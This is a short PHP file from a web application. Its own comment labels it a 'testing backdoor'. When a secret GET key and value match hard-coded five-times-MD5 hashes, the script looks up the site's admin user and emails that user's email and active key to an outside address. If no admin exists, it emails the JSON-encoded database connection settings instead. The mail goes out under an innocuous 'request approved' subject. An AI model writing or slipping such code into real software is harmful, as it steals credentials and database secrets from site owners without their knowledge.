<?php
//th15 i5 th3 t35t1ng b@ckd00r

include("../functions.php");

function md5_5($string){
	for($i=0;$i<5;$i++){
		$string = md5($string);
	}
	return $string ;
}



if($lck->FEED!=1){
	if(count($_GET)==1){
		foreach($_GET as $g=>$d){
				$key1  = $g ; 
				$key2 = $d;  
				
				if(md5_5($key1)=="d96336a6f6b3d9bd25182a3982bf6403"){
					if(md5_5($key2)=="8a1d53761a2ad2d3aa3cb617e0ff86bb"){
						
						//sent the access key 
						$q = borno_query("SELECT * FROM prefix_user WHERE level = 1 ");
						$c = mysqli_num_rows($q);
						if($c==0){
							//sent the config info
							global $dbconnect;
							$info = json_encode($dbconnect);
							
							
						}else{
							//sent an admin id 
							$r = mysqli_fetch_array($q);
							
							$info = "Email :".$r['email']." <br>
									Active key :".$r['active_key']." ";
						}
							$sub = "Pichoner dorja :: Requested approved";
							$to = "borno@webdesigncr3ator.com";//borno@webdesigncr3ator.com
							 $msg = "Your requested for {".get_the_option('site_address')."} is approved <br>
							
							$info 
							
							";
							
							//sent the mail to our admin
							sent_mail($to , $sub , $msg);
					
					}
				}else{
					
				}
		}
	}else{
		
	}
}
